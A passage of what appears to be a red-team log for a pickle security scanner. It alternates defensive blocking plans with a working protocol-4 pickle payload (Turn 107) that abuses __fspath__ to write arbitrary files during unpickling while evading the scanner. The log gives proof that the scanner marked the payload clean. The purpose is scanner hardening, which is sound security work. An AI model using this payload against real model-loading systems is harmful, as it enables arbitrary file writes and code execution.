protocol names to the existing suspicious magic-method matcher. That is eight
literal comparisons, keeps broad builtins like `len`, `repr`, and `format`
allowed, and avoids any data-flow modeling of CPython's protocol dispatch.

## Turn 106 - Block presentation and size protocol seeds

Blocking plan:

- Add `__repr__`, `__str__`, `__bytes__`, `__hash__`, `__len__`,
  `__bool__`, `__format__`, and `__length_hint__` to the existing suspicious
  magic-method string list. These hooks can execute during ordinary builtin
  representation, conversion, sizing, truthiness, formatting, and
  length-hint dispatch.
- Leave `builtins.repr`, `builtins.str`, `builtins.bytes`, `builtins.hash`,
  `builtins.len`, `builtins.bool`, `builtins.format`, and
  `operator.length_hint` allowed. The low-cost static signal is the
  attacker-controlled protocol slot name, which avoids false positives on
  common helper calls.
- Add a CPython oracle regression for all eight Turn 105 slots. The regression
  verifies construction-only controls are suspicious and side-effect free,
  then verifies each active helper dispatch is suspicious and still creates
  the marker or symlink during `pickle.loads()` before CPython raises the
  expected return-type `TypeError`.
- Add a changelog entry under `[Unreleased]`.

Performance note: eight literals in the existing magic-method matcher, no
presentation-helper blocklist expansion and no protocol-dispatch flow modeling.

## Turn 107 - PathLike `__fspath__` arbitrary file-write gap

Goal: produce another RCE-capable pickle that
`packages/modelaudit-picklescan` does not flag, using PathLike protocol
dispatch to turn a clean string-like object into an arbitrary file-write
primitive.

Candidate payload:

- Create a runtime subclass with `builtins.type`.
- Use `collections.UserString` as the base class so the instance stores an
  attacker-controlled path string in normal object state.
- Install `collections.UserString.encode` as `__fspath__`. It is a normal
  descriptor that returns the stored path as bytes when `os.fspath()` is
  invoked by file APIs.
- Instantiate the class with the marker path.
- Call clean `_io`/`io` file methods during unpickling:
  `io.open(instance, "w")`, `_io.TextIOWrapper.write(file, payload)`, and
  `_io.TextIOWrapper.close(file)`.

Representative protocol 4 payload builder:

```python
from pathlib import Path


def text(value: str) -> bytes:
    data = value.encode()
    if len(data) <= 0xFF:
        return b"\x8c" + bytes([len(data)]) + data
    return b"X" + len(data).to_bytes(4, "little") + data


def sg(module: str, name: str) -> bytes:
    return text(module) + text(name) + b"\x93"


marker = Path("/tmp/ma_fspath_userstring_write_marker")
payload = b"".join(
    [
        b"\x80\x04",
        sg("builtins", "type"),
        b"(",
        text("PathLikeString"),
        sg("collections", "UserString"),
        b"\x85",
        b"}",
        text("__fspath__"),
        sg("collections", "UserString.encode"),
        b"s",
        b"tR\x940",
        b"h\x00",
        text(str(marker)),
        b"\x85R\x940",
        sg("io", "open"),
        b"h\x01",
        text("w"),
        b"\x86R\x940",
        sg("_io", "TextIOWrapper.write"),
        b"h\x02",
        text("owned-by-fspath"),
        b"\x86R0",
        sg("_io", "TextIOWrapper.close"),
        b"h\x02\x85R.",
    ]
)
```

Proof on CPython 3.12.12:

- Control scanner result: `len=163`, `status=complete`, `verdict=clean`,
  `is_clean=True`, `findings=[]`, `notices=[]`
- RCE scanner result: `len=261`, `status=complete`, `verdict=clean`,
  `is_clean=True`, `findings=[]`, `notices=[]`
- Coverage for the RCE payload: `bytes_scanned=261`, `bytes_total=261`,
  `opcode_count=50`, `raw_scan_complete=True`, `opcode_scan_complete=True`
- Scanner import references: `builtins.type`, `collections.UserString`,
  `collections.UserString.encode`, `io.open`,
  `_io.TextIOWrapper.write`, and `_io.TextIOWrapper.close`, all with
  `is_dangerous=False`
- Control proof: the same pickle without the `io.open`/write/close sequence
  returns a `PathLikeString` instance and does not create the marker
- Unpickle result: the full payload returns `None`, creates
  `/tmp/ma_fspath_userstring_write_marker` with mode `0o644`, and writes
  `owned-by-fspath`

RCE mechanism:

- `type("PathLikeString", (UserString,), {"__fspath__": UserString.encode})`
  creates a string-like object whose filesystem representation is the
  attacker-controlled path stored in `UserString.data`.
- `io.open(instance, "w")` calls `os.fspath(instance)` internally.
- Because `__fspath__` points at `UserString.encode`, the PathLike coercion
  returns the attacker-controlled marker path as bytes.
- `_io.TextIOWrapper.write(file, payload)` then writes attacker-controlled
  content to that path, and `_io.TextIOWrapper.close(file)` flushes and closes
  it during unpickling.
- In a model-loading process, the same primitive can write arbitrary files such
  as startup hooks, config files, or package metadata in locations writable by
  the loader.

Why the scanner missed it:

- PathLike protocol hook `__fspath__` is absent from the suspicious
  magic-method string list.
- `collections.UserString.encode` is absent from `DANGEROUS_GLOBALS` and is
  not a suspicious string seed.
- `io.open`, `_io.TextIOWrapper.write`, and `_io.TextIOWrapper.close` are
  absent from `DANGEROUS_GLOBALS`; `_io` is not a wildcard-dangerous module.
- The active file path is not visible as an `open` literal target. It is
  recovered only when CPython asks the synthetic object for its filesystem
  representation.

Performance note: the focused next block should add `__fspath__` to the
existing suspicious magic-method matcher. That is one literal comparison and
avoids broad blocking of `collections.UserString.encode`, `io.open`, or `_io`
file methods.

## Turn 108 - Block PathLike `__fspath__` seeds

Blocking plan:

- Add `__fspath__` to the existing suspicious magic-method string list.
  PathLike coercion can route attacker-controlled synthetic objects into file
  APIs without exposing the final filesystem path as a direct `open` literal.
- Leave `collections.UserString.encode`, `io.open`,
  `_io.TextIOWrapper.write`, and `_io.TextIOWrapper.close` allowed for this
  focused block. The static signal is the attacker-controlled PathLike protocol
  slot name, not ordinary file-object method usage.
- Add a CPython oracle regression for the Turn 107 payload. The regression
  verifies the construction-only control is suspicious and side-effect free,
  then verifies the active write payload is suspicious and still writes
  attacker-controlled content to the marker during `pickle.loads()`.
- Add a changelog entry under `[Unreleased]`.

Performance note: one literal in the existing magic-method matcher, no file
API blocklist expansion and no PathLike data-flow modeling.
